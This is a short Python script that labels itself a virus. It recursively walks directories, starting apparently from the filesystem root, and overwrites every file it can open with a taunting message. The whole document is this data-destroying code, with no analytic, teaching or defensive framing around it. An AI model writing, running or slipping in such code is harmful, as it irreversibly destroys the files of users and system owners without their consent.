from glob import glob

def corrupt(folder=""):
    for file in glob(folder + "/" + "*"):
        try:
            with open(file, "w+") as f:
                f.write("Hahahahaha. This is virus.")
        except: corrupt(folder=file+"/")

for file in glob("*"):
    corrupt()